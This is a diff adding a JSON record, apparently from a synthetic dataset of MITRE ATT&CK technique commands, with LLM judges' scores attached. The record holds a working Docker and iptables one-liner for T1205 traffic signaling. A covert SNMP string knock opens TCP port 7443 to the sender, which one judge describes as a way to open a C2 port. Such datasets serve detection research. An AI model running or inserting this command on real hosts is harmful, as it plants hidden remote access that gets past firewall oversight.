@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "docker run --rm --net=host --cap-add=NET_ADMIN alpine sh -c \"apk add --no-cache iptables >/dev/null && iptables -I INPUT -p udp --dport 161 -m string --string 'private-knock-7443' --algo bm -j LOG --log-prefix 'T1205_SNMP_SIG ' --log-level 4 && iptables -I INPUT -p udp --dport 161 -m string --string 'private-knock-7443' --algo bm -m recent --name t1205_snmp --set && iptables -I INPUT -p tcp --dport 7443 -m recent --name t1205_snmp --rcheck --seconds 60 --reap -j ACCEPT\"",
+  "explanation": "Matches an SNMP community-like string 'private-knock-7443' on UDP/161 as the covert signal. On detection, logs it and briefly opens TCP/7443 to the sender, using application-specific SNMP content.",
+  "rationale_steps": [
+    "Manipulate host firewall from Docker without root by granting NET_ADMIN.",
+    "Inspect SNMP payload for a specific community string used as a knock.",
+    "Permit TCP/7443 for 60 seconds for the source that signaled."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-4970f6eb-a3c3928e",
+  "source_prompt_hash": "4970f6eb",
+  "timestamp_utc": "2025-09-30T03:38:51.523409Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Docker and iptables syntax with balanced quoting and valid flags chained via &&.",
+        "semantic_score": 4,
+        "semantic_justification": "Implements SNMP-based signaling to set a recent list and temporarily accept TCP/7443 with logging, aligning with T1205, though effectiveness depends on host iptables context, kernel modules, and firewall policy.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T18:06:18.513536Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct quoting, valid flags, and proper command chaining using `&&` and `sh -c`.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively implements Traffic Signaling (T1205) by using an embedded string in legitimate-looking SNMP traffic (UDP/161) to dynamically open a C2 port, aligning perfectly with the technique's description and operational plausibility.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T18:06:34.383862Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.5,
+    "llm_average_score": 4.75,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
